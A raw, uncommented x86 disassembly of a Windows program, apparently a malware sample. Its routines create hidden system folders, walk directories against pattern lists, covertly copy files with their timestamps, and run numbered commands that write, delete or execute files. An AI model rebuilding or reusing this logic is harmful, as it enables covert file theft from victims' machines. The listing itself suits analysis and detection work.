sub_401000
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call [ lstrlenW@IAT ]
mov edi [ lstrcatW@IAT ]
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
push esi
call edi
push r--data
push esi
call edi
push 0x0
push esi
call [ CreateDirectoryW@IAT ]
test eax eax
jne r-xdata
push 0x6
push esi
call [ SetFileAttributesW@IAT ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
cmp eax 0x50
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp eax 0xb7
je r-xdata
xor ecx ecx
mov [ esi + ebx * 2 ] cx
sub_401070
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push r--data
push esi
call sub_401000
push r--data
push esi
call sub_401000
mov eax [ rw-data ]
push eax
push esi
call sub_401000
pop esi
pop ebp
retn 0x4
sub_4010a0
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x20a ]
push ecx
mov [ ebp - 0x210 ] 0x0
mov [ ebp - 0x20c ] ax
call sub_403840
add esp 0xc
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x210 ]
push edx
push 0x0
push 0x0
push esi
call [ GetVolumeInformationW@IAT ]
mov eax [ ebp - 0x210 ]
mov ecx [ rw-data ]
mov edi [ wsprintfW@IAT ]
push eax
push ecx
lea edx [ ebp - 0x20c ]
push r--data
push edx
call edi
mov ebx [ GetFileAttributesW@IAT ]
add esp 0x10
lea eax [ ebp - 0x20c ]
push eax
call ebx
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40382c
mov esp ebp
pop ebp
retn 0x4
push esi
lea ecx [ ebp - 0x20c ]
push r--data
push ecx
call edi
add esp 0xc
lea edx [ ebp - 0x20c ]
push edx
call ebx
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_40382c
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x210 ]
mov ecx [ rw-data ]
push eax
push ecx
lea edx [ ebp - 0x20c ]
push r--data
push edx
call edi
add esp 0x10
push 0x0
push 0x6
push 0x2
push 0x0
push 0x0
push 0x2
lea eax [ ebp - 0x20c ]
push eax
call [ CreateFileW@IAT ]
cmp eax 0xffffffff
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_4011d0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
add edi eax
mov ecx eax
shr ecx 0x3
mov eax edi
mov ebx ecx
shr eax 0x3
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] eax
cmp ebx eax
jae r-xdata
cmp ebx ecx
jne r-xdata
lea ecx [ ebx * 8 ]
mov edi 0x1
sub edi ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edi
jmp r-xdata
xor ecx ecx
mov ecx [ ebp + 0x10 ]
and ecx 0x7
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov al bl
add ebx ebx
add ebx ebx
add ebx ebx
mov edi esi
sub edi ebx
mov [ ebp - 0x18 ] edi
mov edi 0x1
sub edi ebx
mov [ ebp - 0x14 ] edi
add al al
mov edi 0x3
sub edi ebx
add al al
mov [ ebp + 0xc ] edi
add al al
mov edi 0x2
sub edi ebx
mov [ ebp + 0x13 ] al
lea eax [ ebx + ecx ]
mov [ ebp + 0x14 ] edi
and edi 0x7
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] edi
cmp ecx edi
jae r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
and ecx 0x7
cmp ecx 0x8
jae r-xdata
mov edi [ ebp + 0xc ]
mov bl [ ebp + 0x13 ]
add bl cl
mov ecx [ ebp + 0x14 ]
add ecx eax
add edi eax
and ecx 0x7
and edi 0x7
xor bl [ edi + esi ]
mov edi [ ebp - 0x14 ]
and bl [ ecx + esi ]
mov ecx [ ebp - 0x18 ]
movzx ecx [ eax + ecx ]
imul ecx eax
add edi eax
shr ecx 0x7
and edi 0x7
xor cl [ edi + esi ]
inc eax
add bl cl
mov ecx [ ebp + 0x8 ]
xor [ eax + edx - 0x1 ] bl
inc ecx
mov [ ebp + 0x8 ] ecx
cmp ecx [ ebp - 0x10 ]
jb r-xdata
mov eax [ ebp - 0x4 ]
mov dl bl
add dl dl
add dl dl
add dl dl
mov [ ebp + 0xf ] dl
add eax ecx
jmp r-xdata
add [ ebp - 0x4 ] 0x8
inc ebx
sub edi 0x8
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] edi
cmp ebx eax
jb r-xdata
add dl cl
lea ebx [ edi + eax + 0x2 ]
and ebx 0x7
xor dl [ ebx + esi ]
lea ebx [ edi + eax + 0x1 ]
and ebx 0x7
and dl [ ebx + esi ]
inc ecx
mov bl dl
lea edx [ esi + edi - 0x1 ]
movzx edx [ edx + eax ]
imul edx eax
add edi eax
shr edx 0x7
and edi 0x7
xor dl [ edi + esi ]
mov edi [ ebp - 0x8 ]
add bl dl
mov edx [ ebp + 0x8 ]
xor [ edx + eax ] bl
inc eax
cmp ecx 0x8
jb r-xdata
mov edi [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
mov dl [ ebp + 0xf ]
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
sub_401360
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push r--data
push 0x0
push ebx
call [ StrRStrIW@IAT ]
or ecx 0xffffffff
mov [ ebp + 0x8 ] eax
test eax eax
je r-xdata
mov eax ecx
pop ebx
pop ebp
retn 0x8
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
xor edi edi
call [ lstrlenW@IAT ]
mov [ ebp + 0xc ] eax
mov eax [ ebp + 0x8 ]
add eax 0x2
push eax
push esi
call [ lstrcatW@IAT ]
push 0x1
push esi
push ebx
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
push 0x6
push esi
call [ SetFileAttributesW@IAT ]
mov eax [ ebp + 0xc ]
xor edx edx
mov [ esi + eax * 2 ] dx
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call [ GetLastError@IAT ]
mov edi eax
cmp edi 0x50
je r-xdata
xor edi edi
call [ GetTickCount@IAT ]
push eax
push r--data
push esi
call [ lstrlenW@IAT ]
lea ecx [ esi + eax * 2 ]
push ecx
call [ wsprintfW@IAT ]
add esp 0xc
push edi
push esi
push ebx
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
cmp edi 0xb7
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
sub_401420
push ebp
mov ebp esp
sub esp 0x234
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
xor ecx ecx
push 0x206
push ecx
lea edx [ ebp - 0x20a ]
push edx
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x20c ] cx
call sub_403840
add esp 0xc
push esi
call [ lstrlenW@IAT ]
mov [ ebp - 0x230 ] eax
mov eax [ ebp - 0x220 ]
lea ebx [ edi + 0x2c ]
push ebx
push eax
lea ecx [ ebp - 0x20c ]
push r--data
push ecx
mov [ ebp - 0x224 ] 0x1
call [ wsprintfW@IAT ]
add esp 0x10
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
push ebx
push esi
call [ lstrcatW@IAT ]
push 0x1
push esi
lea edx [ ebp - 0x20c ]
push edx
call [ CopyFileW@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push r--data
lea edx [ ebp - 0x20c ]
push edx
call [ lstrcatW@IAT ]
mov edx [ rw-data ]
mov edi [ WriteFile@IAT ]
test edx edx
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x50
je r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
lea eax [ ebp - 0x20c ]
lea esi [ eax + 0x2 ]
nop
cmp [ ebp - 0x224 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x1
push esi
call [ CreateFileW@IAT ]
mov [ ebp - 0x220 ] eax
cmp eax 0xffffffff
je r-xdata
cmp eax 0xb7
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40382c
mov esp ebp
pop ebp
retn 0x14
lea eax [ ebp - 0x20c ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
push 0x0
sar eax 0x1
lea ecx [ ebp - 0x234 ]
push ecx
add eax eax
push eax
lea ecx [ ebp - 0x20c ]
push ecx
push edx
call edi
test eax eax
je r-xdata
mov ecx [ ebp - 0x230 ]
xor eax eax
mov [ esi + ecx * 2 ] ax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_40382c
mov esp ebp
pop ebp
retn 0x14
test ebx ebx
je r-xdata
lea edx [ ebp - 0x20c ]
push edx
call [ DeleteFileW@IAT ]
push 0x0
push esi
lea ecx [ ebp - 0x20c ]
push ecx
call [ CopyFileW@IAT ]
mov ebx eax
xor ecx ecx
xor edx edx
mov [ ebp - 0x21c ] dx
lea edx [ ebp - 0x22c ]
push edx
push ecx
push ecx
push eax
mov [ ebp - 0x22c ] ecx
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x21a ] ecx
mov [ ebp - 0x216 ] ecx
mov [ ebp - 0x212 ] ecx
mov [ ebp - 0x20e ] cx
call [ GetFileTime@IAT ]
mov eax [ ebp - 0x228 ]
cmp eax [ edi + 0x18 ]
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
push 0x0
sar eax 0x1
lea edx [ ebp - 0x234 ]
push edx
add eax eax
push eax
lea ecx [ ebp - 0x20c ]
push ecx
push esi
call edi
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40382c
mov esp ebp
pop ebp
retn 0x14
push 0x6
push esi
call [ SetFileAttributesW@IAT ]
lea edx [ ebp - 0x21c ]
push edx
add edi 0x14
push edi
call [ FileTimeToSystemTime@IAT ]
movzx eax [ ebp - 0x20e ]
movzx ecx [ ebp - 0x210 ]
movzx edx [ ebp - 0x212 ]
push eax
movzx eax [ ebp - 0x214 ]
push ecx
movzx ecx [ ebp - 0x216 ]
push edx
movzx edx [ ebp - 0x21a ]
push eax
movzx eax [ ebp - 0x21c ]
push ecx
push edx
push eax
push r--data
push esi
call [ lstrlenW@IAT ]
lea ecx [ esi + eax * 2 ]
push ecx
call [ wsprintfW@IAT ]
add esp 0x24
push 0x1
push esi
lea edx [ ebp - 0x20c ]
push edx
call [ CopyFileW@IAT ]
mov ebx eax
mov eax [ ebp - 0x220 ]
push eax
call [ CloseHandle@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x22c ]
cmp ecx [ edi + 0x14 ]
jne r-xdata
mov eax [ ebp - 0x220 ]
push eax
mov [ ebp - 0x224 ] 0x0
call [ CloseHandle@IAT ]
jmp r-xdata
sub_401720
push ebp
mov ebp esp
sub esp 0x8c4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
push eax
push edi
lea edx [ ebp - 0x20c ]
push r--data
push edx
mov [ ebp - 0x8c0 ] eax
mov [ ebp - 0x8b8 ] ecx
call [ wsprintfW@IAT ]
add esp 0x10
push ebx
call [ lstrlenW@IAT ]
mov [ ebp - 0x8c4 ] eax
lea eax [ ebp - 0x664 ]
push eax
lea ecx [ ebp - 0x20c ]
push ecx
call [ FindFirstFileW@IAT ]
mov esi eax
push edi
lea eax [ ebp - 0x414 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea ecx [ ebp - 0x8b4 ]
push ecx
lea edx [ ebp - 0x414 ]
push edx
call [ FindFirstFileW@IAT ]
mov esi eax
mov [ ebp - 0x8bc ] esi
jmp r-xdata
test [ ebp - 0x664 ] 0x10
jne r-xdata
cmp esi 0xffffffff
je r-xdata
lea edx [ ebp - 0x664 ]
push edx
push esi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ ebp - 0x650 ]
cmp edx [ ebp - 0x64c ]
jg r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40382c
mov esp ebp
pop ebp
retn 0x1c
test [ ebp - 0x8b4 ] 0x10
je r-xdata
cmp esi 0xffffffff
je r-xdata
push esi
call [ FindClose@IAT ]
jl r-xdata
lea ecx [ ebp - 0x8b4 ]
push ecx
push esi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x888 ]
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x20 ]
mov edx [ ebp - 0x8b8 ]
push eax
push 0x0
lea ecx [ ebp - 0x664 ]
push ecx
push edx
push edi
call sub_401420
test eax eax
jne r-xdata
cmp [ ebp + 0x18 ] eax
ja r-xdata
push esi
call [ FindClose@IAT ]
push r--data
lea ecx [ ebp - 0x888 ]
push ecx
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x20 ]
push eax
push 0x0
lea ecx [ ebp - 0x664 ]
push ecx
push ebx
push edi
call sub_401420
lea edx [ ebp - 0x888 ]
push edx
push edi
lea eax [ ebp - 0x20c ]
push r--data
push eax
call [ wsprintfW@IAT ]
mov edx [ ebp - 0x8c4 ]
add esp 0x10
xor ecx ecx
mov [ ebx + edx * 2 ] cx
mov esi rw-data
jmp r-xdata
mov eax [ esi ]
push eax
lea ecx [ ebp - 0x20c ]
push ecx
call [ StrStrW@IAT ]
test eax eax
jne r-xdata
mov esi [ ebp - 0x8bc ]
add esi 0x4
cmp esi rw-data
jl r-xdata
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
mov edx [ esi ]
push edx
lea eax [ ebp - 0x20c ]
push eax
call [ StrStrW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x20 ]
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0x18 ]
push ecx
mov ecx [ ebp - 0x8b8 ]
push edx
mov edx [ ebp - 0x8c0 ]
push eax
push ecx
push ebx
push edx
lea eax [ ebp - 0x20c ]
push eax
call sub_401720
sub_401950
push ebp
mov ebp esp
mov eax 0x1924
call sub_4038c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x8 ]
push eax
push edi
mov [ ebp - 0x1914 ] ecx
xor ecx ecx
lea edx [ ebp - 0xa2c ]
push r--data
push edx
mov [ ebp - 0x1920 ] eax
mov [ ebp - 0x1908 ] ebx
mov [ ebp - 0x1918 ] esi
mov [ ebp - 0x1924 ] ecx
mov [ ebp - 0x190c ] ecx
call [ wsprintfW@IAT ]
add esp 0x10
push ebx
mov ebx [ lstrlenW@IAT ]
call ebx
mov [ ebp - 0x191c ] eax
test esi esi
jne r-xdata
lea edx [ ebp - 0x16b4 ]
push edx
lea eax [ ebp - 0xa2c ]
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x1910 ] eax
jmp r-xdata
cmp [ ebp + 0x1c ] esi
jne r-xdata
cmp [ ebp - 0x1910 ] 0xffffffff
je r-xdata
mov edx [ rw-data ]
push edx
call ebx
lea eax [ edi + eax * 2 ]
lea eax [ edi + 0x6 ]
jmp r-xdata
push edi
lea eax [ ebp - 0x1454 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea ecx [ ebp - 0x1904 ]
push ecx
lea edx [ ebp - 0x1454 ]
push edx
call [ FindFirstFileW@IAT ]
mov ebx [ StrStrW@IAT ]
mov esi eax
mov [ ebp - 0x190c ] esi
test [ ebp - 0x16b4 ] 0x10
jne r-xdata
mov ecx [ ebp - 0x1908 ]
push eax
push ecx
call sub_401000
cmp [ ebp + 0x1c ] 0x0
je r-xdata
test [ ebp - 0x1904 ] 0x10
je r-xdata
mov ecx [ ebp - 0x1910 ]
lea eax [ ebp - 0x16b4 ]
push eax
push ecx
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40382c
mov esp ebp
pop ebp
retn 0x18
push edi
call [ RemoveDirectoryW@IAT ]
lea edx [ ebp - 0x1904 ]
push edx
push esi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x18d8 ]
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1910 ]
push edx
call [ FindClose@IAT ]
mov esi [ ebp - 0x1918 ]
test esi esi
jne r-xdata
lea ecx [ ebp - 0x1464 ]
push ecx
lea edx [ ebp - 0x16a0 ]
push edx
call [ FileTimeToSystemTime@IAT ]
mov eax [ ebp - 0x1694 ]
mov ecx [ ebp - 0x1698 ]
movzx edx [ ebp - 0x145a ]
push eax
movzx eax [ ebp - 0x145c ]
push ecx
movzx ecx [ ebp - 0x145e ]
push edx
movzx edx [ ebp - 0x1462 ]
push eax
movzx eax [ ebp - 0x1464 ]
push ecx
push edx
push eax
lea ecx [ ebp - 0x1688 ]
push ecx
push edi
lea edx [ ebp - 0x1454 ]
push r--data
push edx
call [ wsprintfW@IAT ]
add esp 0x2c
push 0x0
lea eax [ ebp - 0x1924 ]
push eax
lea ecx [ ebp - 0x1454 ]
push ecx
call ebx
add eax eax
push eax
lea edx [ ebp - 0x1454 ]
push edx
push esi
call [ WriteFile@IAT ]
mov esi rw-data
cmp esi 0xffffffff
je r-xdata
push esi
call [ FindClose@IAT ]
push r--data
lea ecx [ ebp - 0x18d8 ]
push ecx
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x1908 ]
push esi
push eax
lea ecx [ ebp - 0x16b4 ]
push ecx
push edx
push edi
call sub_401420
mov eax [ ebp - 0x1914 ]
test eax eax
je r-xdata
add esi 0x4
cmp esi rw-data
jl r-xdata
lea edx [ ebp - 0x18d8 ]
push edx
push edi
lea eax [ ebp - 0xa2c ]
push r--data
push eax
call [ wsprintfW@IAT ]
mov edx [ ebp - 0x1908 ]
mov eax [ ebp - 0x191c ]
add esp 0x10
xor ecx ecx
mov [ edx + eax * 2 ] cx
mov esi rw-data
mov edx [ ebp + 0x1c ]
mov ecx [ ebp - 0x1908 ]
push 0x0
push edx
lea eax [ ebp - 0x16b4 ]
push eax
push ecx
push edi
call sub_401420
mov [ ebp - 0x190c ] 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax [ esi ]
push eax
lea ecx [ ebp - 0x1688 ]
push ecx
call [ StrStrIW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x190c ] eax
jne r-xdata
mov esi [ ebp - 0x190c ]
add esi 0x4
cmp esi rw-data
jl r-xdata
mov edx [ ebp + 0x1c ]
push 0x0
push edx
lea ecx [ ebp - 0x16b4 ]
push ecx
push eax
push edi
call sub_401420
mov esi rw-data
mov ecx [ esi ]
push ecx
lea edx [ ebp - 0xa2c ]
push edx
call ebx
test eax eax
jne r-xdata
mov esi rw-data
mov eax [ ebp - 0x1914 ]
test eax eax
je r-xdata
add esi 0x4
cmp esi rw-data
jl r-xdata
add esi 0x4
cmp esi rw-data
jl r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x1908 ]
push 0x0
push eax
lea ecx [ ebp - 0x16b4 ]
push ecx
push edx
push edi
call sub_401420
cmp [ eax ] 0x0
je r-xdata
mov edx [ esi ]
push edx
lea eax [ ebp - 0x1688 ]
push eax
call [ StrStrIW@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ esi ]
push eax
lea ecx [ ebp - 0xa2c ]
push ecx
call ebx
test eax eax
jne r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ ebp - 0x1918 ]
mov ecx [ ebp - 0x1914 ]
push edx
mov edx [ ebp - 0x1908 ]
push eax
mov eax [ ebp - 0x1920 ]
push ecx
push edx
push eax
lea ecx [ ebp - 0xa2c ]
push ecx
call sub_401950
mov ecx [ ebp + 0x1c ]
push 0x0
push ecx
lea edx [ ebp - 0x16b4 ]
push edx
push eax
push edi
call sub_401420
sub_401d50
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x20a ]
push ecx
mov [ ebp - 0x20c ] ax
call sub_403840
mov edx [ rw-data ]
push edx
lea eax [ ebp - 0x20c ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x18
push 0x0
push 0x6
push 0x4
push 0x0
push 0x0
push 0x2
lea ecx [ ebp - 0x20c ]
push ecx
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor al al
pop esi
call sub_40382c
mov esp ebp
pop ebp
retn 0x8
push 0x2
push 0x0
push 0x0
push esi
call [ SetFilePointer@IAT ]
mov eax [ ebp + 0xc ]
push 0x0
lea edx [ ebp - 0x210 ]
push edx
push eax
push edi
push esi
mov [ ebp - 0x210 ] 0x0
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x20c ]
push ecx
push r--data
push 0x0
call [ ShellExecuteW@IAT ]
pop edi
mov al 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40382c
mov esp ebp
pop ebp
retn 0x8
sub_401e40
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
push esi
mov esi [ StrChrIW@IAT ]
push 0x3d
push eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] edx
call esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40382c
mov esp ebp
pop ebp
retn 0x10
push ebx
lea ebx [ eax + 0x2 ]
push 0x3d
xor ecx ecx
push ebx
mov [ eax ] cx
call esi
test eax eax
je r-xdata
pop ebx
xor edx edx
mov [ eax ] dx
add eax 0x2
push edi
push eax
mov [ ebp - 0x1c ] eax
call [ StrToIntW@IAT ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ GetLocalTime@IAT ]
lea ecx [ ebp - 0x30 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
call [ SystemTimeToFileTime@IAT ]
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0x30 ]
mov edi [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x28 ]
push 0xc9
cdq
push 0x2a69c000
push edx
push eax
call sub_4038f0
mov ecx [ ebp - 0x24 ]
sub esi eax
mov eax [ ebp - 0x18 ]
sbb edi edx
mov edx [ ebp - 0x20 ]
push edi
push esi
push ecx
push edx
push ebx
push eax
call sub_401720
mov eax [ ebp - 0x1c ]
mov ecx 0x3d
mov edx ecx
mov [ ebx - 0x2 ] cx
mov [ eax - 0x2 ] dx
pop edi
sub_401f20
push ebp
mov ebp esp
sub esp 0xe50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
push 0x206
push ecx
lea edx [ ebp - 0x20a ]
push edx
mov [ ebp - 0xe48 ] edi
mov [ ebp - 0xe44 ] esi
mov [ ebp - 0xe40 ] eax
mov [ ebp - 0x20c ] cx
call sub_403840
mov ebx [ CreateFileW@IAT ]
add esp 0xc
cmp eax 0x2
jne r-xdata
push esi
push edi
call sub_401360
test eax eax
je r-xdata
cmp eax 0x3
jne r-xdata
mov ecx [ ebp - 0xe40 ]
push 0x0
push ecx
push esi
push edi
call sub_401e40
jmp r-xdata
push edi
call [ lstrlenW@IAT ]
lea edi [ edi + eax * 2 + 0x2 ]
mov eax edi
sub eax [ ebp - 0xe48 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp - 0xe40 ]
push eax
push edi
call sub_401360
jmp r-xdata
cmp eax 0x4
jne r-xdata
mov edx [ rw-data ]
push edx
lea eax [ ebp - 0x20c ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
push 0x0
push 0x6
push 0x4
push 0x0
push 0x0
push 0x2
lea ecx [ ebp - 0x20c ]
push ecx
call ebx
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_40382c
mov esp ebp
pop ebp
retn 0x10
mov esi [ ebp - 0xe44 ]
jmp r-xdata
cmp eax 0x5
jne r-xdata
cmp [ edi ] 0x21
jne r-xdata
push 0x2
push 0x0
push 0x0
push esi
call [ SetFilePointer@IAT ]
push 0x0
lea edx [ ebp - 0xe4c ]
push edx
push edi
mov [ ebp - 0xe4c ] 0x0
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
push edi
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0xe40 ]
mov edx [ ebp - 0xe44 ]
push 0x0
push ecx
push edx
push edi
call sub_401e40
jmp r-xdata
movzx eax [ edi ]
add edi 0x2
cmp eax 0x1
jne r-xdata
cmp eax 0x6
je r-xdata
mov eax [ rw-data ]
push eax
push r--data
jmp r-xdata
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x412 ]
push ecx
mov [ ebp - 0x414 ] ax
call sub_403840
mov edx [ rw-data ]
push edx
lea eax [ ebp - 0x414 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x18
lea ecx [ ebp - 0x414 ]
push ecx
call [ DeleteFileW@IAT ]
lea edx [ ebp - 0xe50 ]
push edx
push 0x0
push 0x0
push sub_4028d0
push 0x0
push 0x0
call [ CreateThread@IAT ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
push ecx
push edi
call sub_401d50
cmp eax 0x7
jne r-xdata
lea ecx [ ebp - 0x20c ]
push ecx
call [ wsprintfW@IAT ]
add esp 0xc
lea edx [ ebp - 0x20c ]
push edx
call [ DeleteFileW@IAT ]
cmp eax 0x8
jne r-xdata
mov eax [ rw-data ]
push eax
push r--data
jmp r-xdata
cmp eax 0x9
jne r-xdata
xor eax eax
push 0xa26
push eax
lea ecx [ ebp - 0xe3a ]
push ecx
mov [ ebp - 0xe3c ] ax
call sub_403840
add esp 0xc
push esi
mov esi [ lstrcpyW@IAT ]
lea edx [ ebp - 0xe3c ]
push edx
call esi
push r--data
lea eax [ ebp - 0xe3c ]
push eax
call [ lstrcatW@IAT ]
push 0x0
push 0x80
push 0x4
push 0x0
push 0x2
push 0x2
lea ecx [ ebp - 0xe3c ]
push ecx
call ebx
mov [ rw-data ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ rw-data ]
push eax
push r--data
push 0x6
lea edx [ ebp - 0xe3c ]
push edx
call [ SetFileAttributesW@IAT ]
mov eax [ ebp - 0xe40 ]
push eax
lea ecx [ ebp - 0xe3c ]
push ecx
call esi
push r--data
lea edx [ ebp - 0xe3c ]
push edx
call [ lstrcatW@IAT ]
push 0x0
push 0x80
push 0x4
push 0x0
push 0x2
push 0x2
lea eax [ ebp - 0xe3c ]
push eax
call ebx
mov [ rw-data ] eax
cmp eax 0xffffffff
jne r-xdata
mov [ rw-data ] 0x0
push 0x6
lea ecx [ ebp - 0xe3c ]
push ecx
call [ SetFileAttributesW@IAT ]
mov edx [ ebp - 0xe40 ]
mov eax [ ebp - 0xe44 ]
push 0x1
push edx
push eax
push edi
call sub_401e40
mov ecx [ rw-data ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
jmp r-xdata
mov [ rw-data ] 0x0
sub_402290
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x20a ]
push ecx
